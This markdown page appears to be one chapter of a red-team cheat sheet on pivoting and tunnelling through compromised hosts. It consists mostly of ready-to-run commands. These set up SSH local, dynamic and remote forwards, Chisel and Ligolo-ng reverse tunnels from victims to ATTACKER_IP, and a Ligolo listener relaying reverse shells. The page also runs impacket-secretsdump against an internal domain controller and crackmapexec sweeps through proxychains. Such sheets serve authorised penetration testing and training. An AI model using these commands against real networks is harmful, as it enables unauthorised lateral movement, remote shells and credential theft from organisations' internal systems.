# 10 — Pivoting & Tunneling

[← Back to index](README.md)

## 10.1 SSH Tunneling

```bash
# Local port forward (access internal service via SSH)
ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_HOST
ssh -L 3389:INTERNAL_WIN:3389 user@PIVOT_SSH -N
# Connect via: xfreerdp /v:127.0.0.1 /u:USER /p:PASS

# Dynamic SOCKS proxy (proxychains)
ssh -D 1080 user@PIVOT_HOST -N
# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -p 445,389,88 10.10.10.0/24
proxychains impacket-secretsdump $DOMAIN/$USER:$PASS@INTERNAL_DC

# Remote port forward (expose internal to attacker)
ssh -R REMOTE_PORT:INTERNAL_HOST:INTERNAL_PORT user@ATTACKER_IP -N

# SSH through jump host
ssh -J user@JUMP_HOST user@INTERNAL_HOST
```

## 10.2 Chisel

```bash
# Download chisel
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64

# Attacker — start server
./chisel_linux_amd64 server --port 8080 --reverse

# Victim — connect back (reverse SOCKS)
.\chisel.exe client ATTACKER_IP:8080 R:socks
# or: ./chisel client ATTACKER_IP:8080 R:socks

# Now proxychains through port 1080 (default chisel SOCKS)
proxychains crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS

# Forward specific port
.\chisel.exe client ATTACKER_IP:8080 R:3389:INTERNAL_WIN:3389
# Connect: xfreerdp /v:127.0.0.1:3389 ...

# Victim is server (firewall allows inbound on victim)
./chisel server --port 8080
./chisel client VICTIM:8080 5985:INTERNAL_WIN:5985   # Forward WinRM
```

## 10.3 Ligolo-ng

Ligolo-ng — TUN interface based pivot (fast, supports all protocols).

```bash
# Attacker — start proxy
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Victim — connect back
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

```text
# In ligolo proxy console:
>> session      # Select session
>> ifconfig     # Show victim's interfaces
>> start        # Start tunneling
```

```bash
# Add route to internal network
sudo ip route add 10.10.10.0/24 dev ligolo

# Now access internal network directly!
crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS
nmap -sT -p 88,389,445 10.10.10.100
```

```text
# Port forward (for reverse shells from internal)
>> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
# Shells sent to VICTIM_IP:1234 will arrive at ATTACKER:4444
```

## 10.4 Other Pivoting Tools

```bash
# Sshuttle — transparent proxy via SSH
sshuttle -r user@PIVOT_HOST 10.10.10.0/24 --ssh-cmd 'ssh -i key.pem'

# Metasploit route (post-module pivot)
# msfconsole:
#   use multi/manage/autoroute
#   run                          # After getting a session
#   route add 10.10.10.0/24 SESSION_ID
#   use auxiliary/server/socks_proxy
#   set SRVPORT 1080; run

# Proxychains configuration
cat /etc/proxychains.conf
# [ProxyList] section at bottom:
#   socks5 127.0.0.1 1080
#   socks4 127.0.0.1 9050

# Nmap via proxychains (TCP only — no ICMP/UDP)
proxychains nmap -sT -Pn -p 22,80,443,445,3389,5985 10.10.10.0/24

# DNS through pivot
proxychains host TARGET_HOST 10.10.10.100   # Use internal DNS
```

---

[← Prev: 09 — MSSQL Attacks & Linked Server Chains](09-mssql-attacks.md) | [Next: 11 — Domain Persistence →](11-domain-persistence.md)
